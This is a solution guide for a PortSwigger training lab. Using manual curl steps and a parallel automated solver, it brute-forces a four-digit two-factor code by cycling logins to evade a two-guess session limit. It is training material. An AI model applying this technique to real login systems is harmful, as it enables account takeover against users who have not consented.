# SOLUTION — 2FA bypass using a brute-force attack

No-fluff reproduction guide. Replace `<LAB-ID>` with your instance host; nothing else is
instance-specific.

## TL;DR

```bash
cd /root/Desktop/PortSwigger_Labs
uv run python solve.py --url "https://<LAB-ID>.web-security-academy.net"
```

The launcher detects the title, runs the lab solver, and exits `0` only after the lab's
status widget flips to *Solved*.

## Manual steps

1. **Credentials.** `carlos:montoya` is given by the lab.

2. **Learn the throttle.** Log in, then submit wrong codes:

   ```bash
   B=https://<LAB-ID>.web-security-academy.net
   curl -s -c j -b j "$B/login" | grep -o 'name="csrf" value="[^"]*"'
   curl -s -c j -b j -X POST "$B/login" -d "csrf=<CSRF>&username=carlos&password=montoya" -i | head -3
   curl -s -c j -b j "$B/login2" | grep -o 'name="csrf" value="[^"]*"'
   curl -s -i -c j -b j -X POST "$B/login2" -d "csrf=<CSRF2>&mfa-code=0000"   # 200 Incorrect security code
   curl -s -i -c j -b j -X POST "$B/login2" -d "csrf=<CSRF3>&mfa-code=0001"   # 200 Incorrect security code
   curl -s -i -c j -b j -X POST "$B/login2" -d "csrf=<CSRF4>&mfa-code=0002"   # 500 No user logged in
   ```

   Two failures kill the session → **2 guesses per authenticated session**, 3 requests of
   login overhead per cycle. No IP-based rate limit and no account lockout, and the code
   survives re-login, so the full 0000–9999 space is reachable.

3. **Brute force.** One cycle per 2 guesses, many sessions in parallel:

   ```
   GET  /login  -> csrf
   POST /login  (csrf, username=carlos, password=montoya)  -> 302 /login2
   GET  /login2 -> csrf2
   POST /login2 (csrf2, mfa-code=XXXX) -> 200 "Incorrect security code" + fresh csrf   [guess 1]
   POST /login2 (csrf_new, mfa-code=YYYY) -> 200 "Incorrect security code" | 302 /my-account [guess 2]
   ```

   Success signal: **`302` with `Location: /my-account`**.

4. **Verify for real.** In the *same* session, request `/my-account`:

   ```bash
   curl -s -b "session=<cookie>" "$B/my-account" | grep "Your username is"
   # Your username is: carlos
   ```

   and check the lab home page contains `widgetcontainer-lab-status is-solved`.
   Do **not** verify by logging in again with the recovered code: the code is single use
   and has already rotated, so a second login returns "Incorrect security code".

5. **Expect a rotating code.** The lab rotates the code while the attack runs. If a full
   sweep of 10,000 codes finds nothing, run another sweep — the solver does this
   automatically (`--max-passes`, default 8).

## Automated solver

`uv run python solve.py --url "<url>" [--workers 24] [--max-passes 4] [--force]`

* shared queue of codes, 2 guesses per login cycle, `--workers` parallel sessions
* re-queues codes the server never evaluated (session already spent)
* success only on `302 → /my-account`, then reads `/my-account` in that session
* adaptive circuit breaker for degraded instances (transport errors, 502/503/504)
* exit `0` only when both the account page and the `is-solved` widget confirm success
